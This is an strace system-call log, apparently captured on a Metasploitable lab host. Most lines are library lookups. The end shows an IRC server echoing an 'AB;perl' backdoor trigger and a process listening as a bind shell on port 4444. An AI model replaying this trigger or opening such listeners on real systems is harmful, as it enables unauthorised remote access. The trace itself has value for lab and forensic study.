6824  07:15:42.898089 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6824  07:15:42.898107 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898128 stat64("/lib/tls/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898142 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898155 stat64("/lib/tls/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898167 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898179 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.898197 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898210 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.898227 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898228 stat64("/lib/tls/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898228 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898228 stat64("/lib/tls/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898228 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898228 stat64("/lib/tls/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898229 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898229 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.898229 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898229 stat64("/lib/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898230 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898231 stat64("/lib/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898243 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898255 stat64("/lib/i686/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898266 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898277 stat64("/lib/i686", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898288 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898300 stat64("/lib/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898311 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898322 stat64("/lib/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898332 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898344 stat64("/lib/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898354 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898365 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.898382 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898395 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898407 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898431 stat64("/usr/lib/tls/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898470 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898484 stat64("/usr/lib/tls/i686/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898512 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898524 stat64("/usr/lib/tls/i686", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898540 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898552 stat64("/usr/lib/tls/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898564 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898576 stat64("/usr/lib/tls/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898587 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898599 stat64("/usr/lib/tls/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898611 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898622 stat64("/usr/lib/tls", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898633 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898646 stat64("/usr/lib/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898658 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898670 stat64("/usr/lib/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898681 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898693 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.898711 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898723 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.898740 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898752 stat64("/usr/lib/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898763 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898775 stat64("/usr/lib/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898786 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898798 stat64("/usr/lib/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898809 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898820 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
6824  07:15:42.898837 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898851 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898863 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898876 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898888 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898901 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898922 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.898966 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.898979 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899009 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899038 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899051 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899063 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899078 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899090 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899103 stat64("/lib/i486-linux-gnu/tls", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899114 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899127 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899139 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899152 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899164 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899177 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899189 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899201 stat64("/lib/i486-linux-gnu/i686", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899213 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899226 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899238 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899250 stat64("/lib/i486-linux-gnu/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899262 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899274 stat64("/lib/i486-linux-gnu/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899286 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899298 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.899315 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899328 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899341 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899355 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899367 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899381 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899393 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899406 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899507 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899550 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899581 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899611 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899623 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899636 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899648 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899663 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899675 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899689 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899701 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899715 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899727 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899740 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899753 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899766 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899778 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899791 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899803 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899816 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899828 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899840 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf80cc9c) = -1 ENOENT (No such file or directory)
6824  07:15:42.899852 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6824  07:15:42.899865 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6824  07:15:42.899884 munmap(0xb7db0000, 29913) = 0
6824  07:15:42.899904 open("/etc/ld.so.cache", O_RDONLY) = 6
6824  07:15:42.899917 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6824  07:15:42.899933 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7db0000
6824  07:15:42.899943 close(6)          = 0
6824  07:15:42.899954 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6824  07:15:42.899968 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
6824  07:15:42.899991 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6824  07:15:42.900128 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6824  07:15:42.900149 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7da5000
6824  07:15:42.900162 mmap2(0xb7dae000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7dae000
6824  07:15:42.900181 close(6)          = 0
6824  07:15:42.900205 munmap(0xb7db0000, 29913) = 0
6824  07:15:42.900222 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6824  07:15:42.900238 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6824  07:15:42.900253 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6824  07:15:42.900270 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db7000
6824  07:15:42.900281 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6824  07:15:42.900464 close(6)          = 0
6824  07:15:42.900474 munmap(0xb7db7000, 4096) = 0
6824  07:15:42.900504 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6824  07:15:42.900545 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6824  07:15:42.900576 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db7000
6824  07:15:42.900587 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6824  07:15:42.900778 close(6)          = 0
6824  07:15:42.900788 munmap(0xb7db7000, 4096) = 0
6824  07:15:42.900815 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
6824  07:15:42.900836 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80d1a8) = -1 EINVAL (Invalid argument)
6824  07:15:42.900851 _llseek(6, 0, 0xbf80d1f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:42.900862 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80d1a8) = -1 EINVAL (Invalid argument)
6824  07:15:42.900873 _llseek(6, 0, 0xbf80d1f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:42.900883 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
6824  07:15:42.900935 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
6824  07:15:42.900970 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
6824  07:15:42.901037 listen(6, 5)      = 0
6824  07:15:42.901108 accept(6,  <unfinished ...>
6823  07:15:42.901374 exit_group(0)     = ?
6821  07:15:42.901448 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6823
6821  07:15:42.901464 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6821  07:15:42.901475 --- SIGCHLD (Child exited) @ 0 (0) ---
6821  07:15:42.901495 waitpid(-1, 0xbfeda258, WNOHANG) = -1 ECHILD (No child processes)
6821  07:15:42.901534 sigreturn()       = ? (mask now [])
6821  07:15:42.901551 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6821  07:15:42.901609 exit_group(0)     = ?
4519  07:15:42.901644 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6821
4519  07:15:42.901656 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:15:42.901670 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:15:42.901681 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:15:42.901690 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:15:42.901709 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:15:42.901775 time(NULL)        = 1495624542
4519  07:15:42.901786 time(NULL)        = 1495624542
